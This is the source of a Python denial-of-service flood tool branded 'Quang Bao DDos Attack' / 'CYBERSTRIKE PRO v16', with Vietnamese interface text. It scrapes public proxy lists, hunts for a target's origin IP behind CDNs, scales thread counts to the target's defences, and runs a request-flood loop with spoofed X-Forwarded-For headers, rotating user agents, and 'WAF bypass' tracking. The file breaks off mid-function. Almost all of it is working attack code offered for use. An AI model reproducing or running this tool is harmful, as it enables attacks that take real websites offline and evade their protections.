#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ☠️ ©2025 Quang Bao DDos Attack ☠️

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
import whois
import dns.resolver
from bs4 import BeautifulSoup
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich.table import Table
from rich import print as rprint

# Initialize console with theme
custom_theme = Theme({
    "info": "bold cyan",
    "warning": "bold yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "bold magenta",
    "extra": "bold white",
    "blue": "bold blue",
    "dimmed": "dim magenta",
    "purple": "bold purple",
    "dim_cyan": "dim cyan",
    "yellow": "bold yellow",
    "dim_green": "dim green"
})
console = Console(theme=custom_theme)

# Code rain effect
def generate_code_rain(width=30, height=5, frame=0):
    chars = "   "
    rain = []
    for i in range(height):
        offset = (frame + i) % height
        line = "".join(random.choice(chars) if random.random() > 0.1 else " " for _ in range(width))
        rain.append(f"[dim_green]{line}[/]")
    return "\n".join(rain)

# Matrix loading effect
def matrix_effect(speed="fast"):
    message = "Đang vào vui lòng chờ...©2025 Quang Bao DDos Attack..."
    colors = ["cyan", "magenta", "purple"]
    symbols = ["⚡", "★", "☠️", "⚙"]
    radar_frames = ["◢", "◣", "◤", "◥"]
    sound_effects = ["*BEEP*", "*TICK*", "*HUM*", "*ZAP*"]
    spinners = ["arc", "dots", "bounce", "point"]
    sleep_time = 0.03 if speed == "fast" else 0.06
    
    with Progress(
        SpinnerColumn(spinner_name=random.choice(spinners)),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=15, style="red", complete_style="cyan"),
        console=console
    ) as progress1, Progress(
        SpinnerColumn(spinner_name=random.choice(spinners)),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=15, style="magenta", complete_style="purple"),
        console=console
    ) as progress2, Progress(
        SpinnerColumn(spinner_name=random.choice(spinners)),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=15, style="blue", complete_style="green"),
        console=console
    ) as progress3:
        task1 = progress1.add_task("[bold cyan]Kết nối mạng[/]", total=len(message))
        task2 = progress2.add_task("[bold magenta]Tải module[/]", total=len(message))
        task3 = progress3.add_task("[bold green]Kích hoạt hệ thống[/]", total=len(message))
        
        radar_index = 0
        for i in range(len(message) + 1):
            partial_message = message[:i]
            color = colors[i % len(colors)]
            symbol = random.choice(symbols)
            radar = radar_frames[radar_index % len(radar_frames)]
            sound = random.choice(sound_effects)
            style = "bold" if i % 2 == 0 else "dim"
            display_text = f"[bold {color}]{radar} {symbol} {partial_message} {symbol} {radar} [yellow]{sound}[/]"

            console.print(generate_code_rain(frame=i), justify="center")
            console.print("")
            progress1.update(task1, advance=1, description=f"[bold cyan]Kết nối mạng: {display_text}[/]")
            if i >= len(message) // 3:
                progress2.update(task2, advance=1, description=f"[bold magenta]Tải module: {display_text}[/]")
            if i >= 2 * len(message) // 3:
                progress3.update(task3, advance=1, description=f"[bold green]Kích hoạt hệ thống: {display_text}[/]")
            
            radar_index += 1
            time.sleep(sleep_time)
        
        for style in ["dim cyan", "bold cyan", "cyan", "bold cyan", "dim cyan"]:
            panel = Panel(
                f"[success]Hệ thống đã sẵn sàng! Kết nối đến Bình Nguyên Vô Tận... [✓][/] [yellow]*PULSE*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
                title="[bold purple]☠️ CYBERSTRIKE PRO v16 ☠️[/]",
                border_style=style
            )
            console.print("")
            console.print(generate_code_rain(frame=i), justify="center")
            console.print("")
            console.print(panel)
            time.sleep(0.15)
        time.sleep(0.5)

# Theme selection
def select_theme():
    colors = ["cyan", "magenta", "green", "blue", "purple"]
    speeds = ["fast", "slow"]
    console.print("[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Chọn theme màu:[/]")
    for color in colors:
        console.print(f"[bold {color}]  - {color.capitalize()} █[/]")
        time.sleep(0.03)
    color_choice = hacker_prompt("Nhập màu (cyan/magenta/green/blue/purple): ", default="purple", choices=colors)
    console.print("[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Chọn tốc độ hiệu ứng:[/]")
    for speed in speeds:
        console.print(f"[bold yellow]  - {speed.capitalize()} ⚡[/]")
        time.sleep(0.03)
    speed_choice = hacker_prompt("Nhập tốc độ (fast/slow): ", default="fast", choices=speeds)
    console.print(f"[success]Đã chọn theme [bold {color_choice}]{color_choice.capitalize()}[/] và tốc độ [bold yellow]{speed_choice.capitalize()}[/] [✓][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
    return color_choice, speed_choice

# Display logo
def display_logo(theme_color):
    logo = f"""
[bold {theme_color}]        ________
       /|_||_\`.__
      (   _    _ _\`-(_)--(_)-(_) [/]
       `-_  CYBERSTRIKE  _-'
          `._  v16  _.' ☠️
"""
    colors = ["magenta", "cyan", "purple", "blue"]
    for i, line in enumerate(logo.splitlines()):
        console.clear()
        console.print("\n".join(logo.splitlines()[:i+1]), style=colors[i % len(colors)])
        time.sleep(0.03)
    console.print(f"[success]CYBERSTRIKE PRO v16 [✓][/] [yellow]*ZAP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")

# Radar effect
def display_radar_effect(theme_color):
    frames = [
        f"[bold {theme_color}]╠══╦══╩══╦══╗ [⚡ QUÉT MỤC TIÊU ⚡] ╠══╗[/] ◢",
        f"[bold magenta]╠══╦══╩══╦══╗ [★ QUÉT MỤC TIÊU ★] ╠══╗[/] ◣",
        f"[bold green]╠══╦══╩══╦══╗ [☆ QUÉT MỤC TIÊU ☆] ╠══╗[/] ◤",
        f"[bold yellow]╠══╦══╩══╦══╗ [⚡ QUÉT MỤC TIÊU ⚡] ╠══╗[/] ◥"
    ]
    for frame in frames:
        console.clear()
        console.print(frame)
        time.sleep(0.08)
    console.clear()

# Exit banner
def display_exit_banner(theme_color):
    frames = [
        f"[bold {theme_color}]╠══╩══╩══╩══╩══╩══╦══╗ [⚡ TẠM BIỆT HACKER ⚡][/]",
        f"[bold magenta]╠══╩══╩══╩══╩══╩══╦══╗ [★ TẠM BIỆT HACKER ★][/]",
        f"[bold green]╠══╩══╩══╩══╩══╩══╦══╗ [☆ TẠM BIỆT HACKER ☆][/]"
    ]
    for frame in frames:
        console.clear()
        console.print(frame)
        time.sleep(0.1)
    console.clear()

# Test proxy
async def test_proxy(proxy, timeout=10):
    try:
        async with aiohttp.ClientSession() as session:
            start = time.time()
            for scheme in ["http", "https"]:
                test_url = f"{scheme}://httpbin.org/ip"
                try:
                    async with session.get(test_url, proxy=proxy, timeout=timeout) as response:
                        if response.status == 200:
                            return True, (time.time() - start) * 1000
                except aiohttp.ClientError:
                    continue
        return False, float('inf')
    except Exception as e:
        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
        console.print(f"[warning]Lỗi kiểm tra proxy {proxy}: [red]{error_msg}[/] [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
        return False, float('inf')

# Fetch proxies
async def fetch_proxies():
    global PROXY_LIST
    if len(PROXY_LIST) >= 50:
        console.print("[success]Sử dụng proxy hiện tại [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
        return
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://proxylist.geonode.com/api/proxy-list"
    ]
    proxies = []
    for source in sources:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(source, timeout=10) as response:
                    if response.status == 200:
                        if source.endswith(".txt"):
                            text = await response.text()
                            proxies.extend([f"http://{line.strip()}" for line in text.splitlines() if line.strip()])
                        else:
                            data = await response.json()
                            if isinstance(data, list):
                                proxies.extend([f"http://{proxy['ip']}:{proxy['port']}" for proxy in data])
                            elif isinstance(data, dict) and 'data' in data:
                                proxies.extend([f"http://{proxy['ip']}:{proxy['port']}" for proxy in data['data']])
                        console.print(f"[success]Lấy được [bold {theme_color}]{len(proxies)}[/] proxy từ {source} [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
        except Exception as e:
            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
            console.print(f"[error]Lỗi lấy proxy từ {source}: [red]{error_msg}[/] [✗][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
    PROXY_LIST = proxies[:200]

# Filter active proxies
async def filter_active_proxies(theme_color):
    global PROXY_LIST
    await fetch_proxies()
    if not PROXY_LIST:
        console.print(f"[warning]Không có proxy khả dụng! Chạy không proxy. [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
        return
    tasks = [test_proxy(proxy, timeout=10) for proxy in PROXY_LIST]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    active_proxies = []
    for proxy, (is_active, response_time) in zip(PROXY_LIST, results):
        if is_active and response_time < 1000:
            active_proxies.append((proxy, response_time))
    active_proxies.sort(key=lambda x: x[1])
    PROXY_LIST = [proxy for proxy, response_time in active_proxies if response_time < 200]
    console.print(f"[success]Lọc được [bold {theme_color}]{len(PROXY_LIST)}[/] proxy hoạt động (nhanh nhất <200ms) [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")

# Refresh proxies periodically
async def refresh_proxies_periodically():
    while True:
        await filter_active_proxies(theme_color)
        await asyncio.sleep(30)

# Hacker prompt
def hacker_prompt(message, default=None, theme_color="purple", choices=None):
    symbols = ["⚡", "★", "☠️", "⚙"]
    colors = ["cyan", "magenta", "purple"]
    prompt_text = f"[bold {random.choice(colors)}]┌─[quangbao㉿attack]─[~]─[{random.choice(symbols)}]\n└─# [bold blue]{message}[/]"
    console.print("")
    try:
        if choices:
            return Prompt.ask(prompt_text, default=default, choices=choices)
        return Prompt.ask(prompt_text, default=default)
    except Exception as e:
        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
        console.print(f"[error]Lỗi nhập liệu: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
        return default

# Check auth key
def check_auth_key(theme_color):
    console.clear()
    console.print(f"[bold {theme_color}]CHÀO MỪNG ĐẾN BÌNH NGUYÊN VÔ TẬN...[/] [success][⚡][/]")
    time.sleep(0.5)
    console.clear()
    key = hacker_prompt("Nhập key xác thực: ", theme_color=theme_color)
    if key != "baoddos":
        console.print("[error]Key không đúng! Thoát. [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
        exit(1)
    console.print("[success]Key hợp lệ! Truy cập hệ thống. [✓][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")

# Check file integrity
def check_file_integrity():
    global EXPECTED_HASH
    EXPECTED_HASH = None
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                console.print(f"[success]Tạo mã băm: [bold magenta]{file_hash[:10]}...[/] [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
            elif file_hash != EXPECTED_HASH:
                console.print("[error]Tệp bị thay đổi! Thoát. [✗][/] [yellow]*ALERT*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                exit(1)
    except Exception as e:
        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
        console.print(f"[error]Lỗi kiểm tra: [red]{error_msg}[/] [✗][/] [yellow]*ALERT*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
        exit(1)

# Loading animation
def loading_animation(message, duration, theme_color):
    with Progress(
        SpinnerColumn(spinner_name="arc"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=20, style="red", complete_style="cyan"),
        console=console
    ) as progress:
        task = progress.add_task(f"[bold {theme_color}]{message}[/]", total=100)
        for i in range(0, 101, 25):
            progress.update(task, advance=25, description=f"[bold {theme_color}]{message} [{i}%] ☠️[/]")
            time.sleep(duration / 4)
        progress.update(task, description=f"[success]{message} [✓][/] [yellow]*BOOM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
]

# Generate random headers
def generate_random_headers():
    fake_ips = [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(100)]
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', 'application/xml', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8', 'es-ES,es;q=0.7']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'identity']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com', 'https://facebook.com']),
        'X-Forwarded-For': random.choice(fake_ips),
        'Cookie': f'sessionid={random.randint(100000,999999)}; lang={random.choice(["en", "vi", "fr"])}',
        'DNT': random.choice(['1', '0']),
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'same-origin', 'no-cors']),
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': random.choice(['document', 'script', 'style'])
    }

# Proxy list
PROXY_LIST = []
def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []
proxy_error_count = 0
waf_bypass_count = 0
rps_data = []

# Validate URL
def validate_url(url):
    if not url:
        raise ValueError("URL không được để trống")
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: {str(e)}")

# Validate IP
def validate_ip(ip):
    if not ip:
        return False
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False

# Smart resolve domain to IP
def smart_resolve_domain_to_ip(domain, theme_color):
    domain = domain.replace('http://', '').replace('https://', '').split('/')[0]
    dns_servers = [
        ('Google', ['8.8.8.8', '8.8.4.4']),
        ('Cloudflare', ['1.1.1.1', '1.0.0.1']),
        ('OpenDNS', ['208.67.222.222', '208.67.220.220'])
    ]
    cdn_indicators = ['cloudflare', 'akamai', 'fastly', 'incapsula', 'sucuri']
    common_subdomains = ['direct', 'origin', 'www', 'mail']
    results = []
    seen_ips = set()

    def is_cdn_ip(ip, resolved_domain):
        try:
            reverse = dns.resolver.resolve(dns.name.from_text(ip).reverse_name(), 'PTR')
            hostname = str(reverse[0].target).lower()
            return any(cdn in hostname for cdn in cdn_indicators)
        except Exception:
            return False

    def calculate_priority(result):
        score = 0
        if result['cdn'] == 'Không':
            score += 100
        if result['type'] == 'A':
            score += 50
        if result['domain'] == domain:
            score += 25
        return score

    for provider, servers in dns_servers:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = servers
        resolver.lifetime = 5.0
        for record_type in ['A', 'AAAA']:
            try:
                answers = resolver.resolve(domain, record_type)
                for rdata in answers:
                    ip = str(rdata)
                    if ip not in seen_ips:
                        is_cdn = is_cdn_ip(ip, domain)
                        results.append({
                            'ip': ip,
                            'type': record_type,
                            'provider': provider,
                            'cdn': 'Có' if is_cdn else 'Không',
                            'domain': domain,
                            'priority': None
                        })
                        seen_ips.add(ip)
            except Exception as e:
                error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
                console.print(f"[warning]Lỗi truy vấn {record_type} từ {provider}: [red]{error_msg}[/] [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")

    for subdomain in common_subdomains:
        test_domain = f"{subdomain}.{domain}"
        for provider, servers in dns_servers:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = servers
            resolver.lifetime = 5.0
            try:
                answers = resolver.resolve(test_domain, 'A')
                for rdata in answers:
                    ip = str(rdata)
                    if ip not in seen_ips:
                        is_cdn = is_cdn_ip(ip, test_domain)
                        results.append({
                            'ip': ip,
                            'type': 'A',
                            'provider': provider,
                            'cdn': 'Có' if is_cdn else 'Không',
                            'domain': test_domain,
                            'priority': None
                        })
                        seen_ips.add(ip)
            except Exception:
                continue

    if results:
        for result in results:
            result['priority'] = calculate_priority(result)
        results.sort(key=lambda x: x['priority'], reverse=True)

        table = Table(
            title=f"[bold {theme_color}]PHÂN TÍCH IP CHO {domain}[/]",
            border_style="bold cyan",
            header_style="bold magenta",
            show_lines=True
        )
        table.add_column("Ưu tiên", style="bold yellow", justify="center", width=10)
        table.add_column("IP", style="bold green", justify="center", width=15)
        table.add_column("Loại", style="bold cyan", justify="center", width=8)
        table.add_column("Nhà cung cấp DNS", style="bold magenta", justify="center", width=15)
        table.add_column("CDN?", style="bold yellow", justify="center", width=8)
        table.add_column("Tên miền", style="bold blue", justify="center", width=20)
        
        for i, result in enumerate(results, 1):
            style = "bold green" if i == 1 else "green"
            priority_text = f"[bold yellow]#{i} ({result['priority']})[/]" if i == 1 else f"[yellow]#{i}[/]"
            table.add_row(
                priority_text,
                f"[{style}]{result['ip']}[/]",
                result['type'],
                result['provider'],
                result['cdn'],
                result['domain']
            )
        
        console.print("")
        console.print(table)

        selected_ip = results[0]['ip']
        summary = Panel(
            f"[bold {theme_color}]IP được chọn:[/] [bold green]{selected_ip}[/]\n"
            f"[bold {theme_color}]Loại:[/] [bold cyan]{results[0]['type']}[/]\n"
            f"[bold {theme_color}]Nhà cung cấp:[/] [bold magenta]{results[0]['provider']}[/]\n"
            f"[bold {theme_color}]CDN:[/] [bold yellow]{results[0]['cdn']}[/]\n"
            f"[bold {theme_color}]Tên miền:[/] [bold blue]{results[0]['domain']}[/]\n"
            f"[yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
            title="[bold purple]TÓM TẮT IP GỐC[/]",
            border_style="bold cyan"
        )
        console.print("")
        console.print(summary)
        console.print(f"[success]IP gốc được chọn: [bold {theme_color}]{selected_ip}[/] [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
        return selected_ip
    else:
        console.print(f"[warning]Không tìm thấy IP cho {domain}! [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
        return None

# Assess target security
def assess_target_security(url, theme_color):
    security_level = "TRUNG BÌNH"
    recommended_threads = 1000
    recommended_requests = 1000

    try:
        response = requests.head(url, headers=generate_random_headers(), timeout=10)
        headers = response.headers
        waf_indicators = ['cloudflare', 'akamai', 'sucuri']
        server = headers.get('Server', '').lower()
        cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)
        rate_limit = 'X-RateLimit-Limit' in headers or response.status_code in (429, 403)
        domain = urllib.parse.urlparse(url).hostname
        whois_info = whois.whois(domain)
        creation_date = whois_info.get('creation_date')
        domain_age = (datetime.now() - creation_date).days if creation_date and isinstance(creation_date, datetime) else 0

        if cdn_waf_detected or rate_limit:
            security_level = "CAO"
            recommended_threads = 5000
            recommended_requests = 2000
        elif domain_age > 365:
            security_level = "TRUNG BÌNH"
            recommended_threads = 2000
            recommended_requests = 1000
        else:
            security_level = "THẤP"
            recommended_threads = 500
            recommended_requests = 500

        console.print(f"[success]Bảo mật: [bold magenta]{security_level}[/], Luồng: [bold {theme_color}]{recommended_threads:,}[/], Yêu cầu: [bold {theme_color}]{recommended_requests:,}[/] [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
    except Exception as e:
        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
        console.print(f"[error]Lỗi đánh giá: [red]{error_msg}[/]. Dùng mặc định. [✗][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")

    return security_level, recommended_threads, recommended_requests

# Adjust threads for device
def adjust_threads_for_device(num_threads, num_requests):
    cpu_count = multiprocessing.cpu_count()
    max_threads = min(num_threads, cpu_count * 1000)
    max_requests = min(num_requests, 9999999)
    console.print(f"[success]Điều chỉnh: [bold {theme_color}]{max_threads:,}[/] luồng, [bold {theme_color}]{max_requests:,}[/] yêu cầu trên [bold magenta]{cpu_count}[/] CPU. [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
    return max_threads, max_requests

# Advanced CLOG attack
def advanced_clog_attack(url, requests_per_thread, duration, progress, task, theme_color):
    global success_count, error_count, response_times, proxy_error_count, waf_bypass_count, rps_data
    session = requests.Session()
    start_time = time.time()
    max_retries = 15
    proxy_index = 0
    sound_effects = ["*BOOM*", "*CRASH*", "*ZAP*", "*VORTEX*", "*KABOOM*"]
    http_methods = ['GET', 'POST', 'HEAD']
    endpoints = ['', '/api', '/login', '/wp-admin', '/admin', '/graphql']
    payloads = [
        {'q': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))},
        {'data': json.dumps({'id': random.randint(1, 1000), 'value': random.random()})},
        {'search': f'term{random.randint(1, 999)}'},
        {}
    ]
    last_rps_time = start_time

    try:
        while time.time() - start_time < duration:
            retries = 0
            current_proxy = get_random_proxy()
            while retries < max_retries:
                try:
                    if current_proxy:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        try:
                            proxy_active, _ = loop.run_until_complete(test_proxy(current_proxy, timeout=10))
                        finally:
                            loop.close()
                        if not proxy_active:
                            with manager:
                                proxy_error_count += 1
                            console.print(f"[warning]Proxy {current_proxy} không hoạt động, thử proxy khác... [⚠][/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                            proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
                            current_proxy = get_random_proxy()
                            retries += 1
                            continue

                    headers = generate_random_headers()
                    method = random.choice(http_methods)
                    endpoint = random.choice(endpoints)
                    target_url = f"{url}{endpoint}"
                    payload = random.choice(payloads)
                    
                    time.sleep(random.uniform(0.01, 0.1))

                    if method == 'POST':
                        response = session.post(target_url, headers=headers, data=payload, proxies={"http": current_proxy, "https": current_proxy} if current_proxy else None, timeout=10)
                    elif method == 'HEAD':
                        response = session.head(target_url, headers=headers, proxies={"http": current_proxy, "https": current_proxy} if current_proxy else None, timeout=10)
                    else:
                        response = session.get(target_url, headers=headers, params=payload, proxies={"http": current_proxy, "https": current_proxy} if current_proxy else None, timeout=10)

                    sound = random.choice(sound_effects)
                    is_waf_bypassed = response.status_code not in (403, 429)
                    if is_waf_bypassed:
                        with manager:
                            waf_bypass_count += 1

                    with manager:
                        success_count += 1
                        response_times.append((time.time() - start_time) * 1000)
                        error_rate = (error_count / max(1, success_count + error_count)) * 100
                        ping_avg = sum(response_times) / len(response_times) if response_times else 0
                        rps = success_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                        waf_bypass_rate = (waf_bypass_count / max(1, success_count)) * 100
                        if time.time() - last_rps_time >= 1:
                            rps_data.append({'time': time.time() - start_time, 'rps': rps})
                            last_rps_time = time.time()

                    if success_count % 10 == 0:
                        console.print(f"[success]CLOG: Phương thức: [bold cyan]{method}[/], Endpoint: [bold blue]{endpoint}[/], Mã: [bold {theme_color}]{response.status_code}[/] [✓][/] [yellow]{sound}[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")

                    with manager:
                        rps_bar = "█" * min(int(rps / 10), 10)
                        ping_bar = "█" * min(int(ping_avg / 50), 10)
                        error_bar = "▒" * min(int(error_rate / 5), 10)
                        proxy_bar = "▓" * min(int(proxy_error_count / 5), 10)
                        waf_bar = "★" * min(int(waf_bypass_rate / 10), 10)
                        rps_color = "bold magenta" if rps > 50 else "bold green" if success_count % 2 == 0 else "bold yellow"
                        progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG SIÊU CẤP[/] [✓][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [WAF Bypass: {waf_bar} {waf_bypass_rate:.1f}%] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    break
                except requests.exceptions.ReadTimeout as e:
                    retries += 1
                    if retries == max_retries:
                        with manager:
                            error_count += 1
                            error_rate = (error_count / max(1, success_count + error_count)) * 100
                            ping_avg = sum(response_times) / len(response_times) if response_times else 0
                            rps = success_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                            rps_data.append({'time': time.time() - start_time, 'rps': rps})
                            rps_bar = "█" * min(int(rps / 10), 10)
                            ping_bar = "█" * min(int(ping_avg / 50), 10)
                            error_bar = "▒" * min(int(error_rate / 5), 10)
                            proxy_bar = "▓" * min(int(proxy_error_count / 5), 10)
                            waf_bar = "★" * min(int(waf_bypass_rate / 10), 10)
                            rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
                            progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG SIÊU CẤP[/] [✗][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [WAF Bypass: {waf_bar} {waf_bypass_rate:.1f}%] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
                        console.print(f"[error]CLOG: Thất bại sau {max_retries} lần: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    else:
                        console.print(f"[warning]CLOG: Timeout, thử lại lần {retries + 1}... [⚠][/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                        proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
                        current_proxy = get_random_proxy()
                        time.sleep(random.uniform(0.05, 0.5))
                except (requests.exceptions.ConnectionError, requests.exceptions.ProxyError) as e:
                    retries += 1
                    if retries == max_retries:
                        with manager:
                            error_count += 1
                            proxy_error_count += 1
                            error_rate = (error_count / max(1, success_count + error_count)) * 100
                            ping_avg = sum(response_times) / len(response_times) if response_times else 0
                            rps = success_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                            rps_data.append({'time': time.time() - start_time, 'rps': rps})
                            rps_bar = "█" * min(int(rps / 10), 10)
                            ping_bar = "█" * min(int(ping_avg / 50), 10)
                            error_bar = "▒" * min(int(error_rate / 5), 10)
                            proxy_bar = "▓" * min(int(proxy_error_count / 5), 10)
                            waf_bar = "★" * min(int(waf_bypass_rate / 10), 10)
                            rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
                            progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG SIÊU CẤP[/] [✗][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [WAF Bypass: {waf_bar} {waf_bypass_rate:.1f}%] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
                        console.print(f"[error]CLOG: Kết nối thất bại: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    else:
                        console.print(f"[warning]CLOG: Lỗi kết nối, thử lại lần {retries + 1}... [⚠][/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                        proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
                        current_proxy = get_random_proxy()
                        time.sleep(random.uniform(0.05, 0.5))
                except Exception as e:
                    if "Tunnel connection failed: 400 Bad Request" in str(e):
                        with manager:
                            proxy_error_count += 1
